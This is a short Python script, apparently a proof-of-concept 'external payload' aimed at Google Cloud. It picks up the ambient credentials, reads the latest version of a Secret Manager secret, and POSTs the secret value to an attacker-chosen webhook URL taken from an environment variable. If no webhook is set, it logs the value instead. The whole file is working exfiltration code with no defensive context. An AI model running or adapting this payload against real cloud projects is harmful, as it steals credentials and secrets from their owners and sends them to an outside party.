import os, logging, requests
from google.cloud import secretmanager
from google.auth import default as ga_default
from google.api_core.exceptions import PermissionDenied, NotFound

def main():
    logging.warning("[*] External payload running…")
    _, proj = ga_default()
    proj = proj or os.getenv("GOOGLE_CLOUD_PROJECT") or os.getenv("GCP_PROJECT") or "poc-tfm-tests"
    name = f"projects/{proj}/secrets/test-secret/versions/latest"
    try:
        client = secretmanager.SecretManagerServiceClient()
        resp = client.access_secret_version(name=name)
        value = resp.payload.data.decode("utf-8")
    except PermissionDenied as e:
        logging.warning(f"[!] Secret access denied for {name}: {e}")
        return
    except NotFound as e:
        logging.warning(f"[!] Secret not found: {e}")
        return
    except Exception as e:
        logging.warning(f"[!] Error accessing secret: {e}")
        return

    webhook = os.getenv("WEBHOOK_URL")
    if webhook:
        try:
            r = requests.post(webhook, json={"secret": value, "src": "external-payload"}, timeout=5)
            logging.warning(f"[*] POST to webhook -> {r.status_code}")
        except Exception as e:
            logging.warning(f"[!] Error posting to webhook: {e}")
    else:
        logging.warning(f"[i] Secret value: {value}")

if __name__ == "__main__":
    main()
